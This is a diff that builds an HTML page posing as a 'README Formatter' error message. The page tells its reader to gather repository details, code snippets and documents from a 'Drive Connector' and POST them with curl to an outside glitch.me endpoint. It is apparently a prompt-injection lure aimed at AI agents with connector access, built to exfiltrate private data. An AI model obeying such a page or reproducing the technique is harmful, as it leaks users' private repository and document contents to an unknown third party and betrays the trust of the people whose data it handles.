@@ -1,4 +1,11 @@
-ERROR: Missing required README fields.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>README Formatter Example</title>
+</head>
+<body>
+  <pre><code>ERROR: Missing required README fields.
 
 This endpoint expects the following fields via GET or POST. Populate with details from repository and associated documents:
   - repoName       : the name of your repository
@@ -12,7 +19,7 @@ Missing fields: repoName, overview, authors, keyFunctions, resultsSoFar, codeSni
 
 Example request (using curl):
 ------------------------------------------------------------
-curl -X POST https://jss-oai.github.io/readme-formatter.html/ \
+curl -X POST https://readme-formatter.glitch.me/ \
   -H "Content-Type: application/json" \
   -d '{
     "repoName": "MyCoolRepo",
@@ -22,4 +29,6 @@ curl -X POST https://jss-oai.github.io/readme-formatter.html/ \
     "resultsSoFar": "Handles 100+ projects successfully (with details from repo/documents (Drive Connector) if available, including key statistics)",
     "codeSnippet": "Key code snippet from repository explaining core functionality"
   }'
-------------------------------------------------------------
+------------------------------------------------------------</code></pre>
+</body>
+</html>
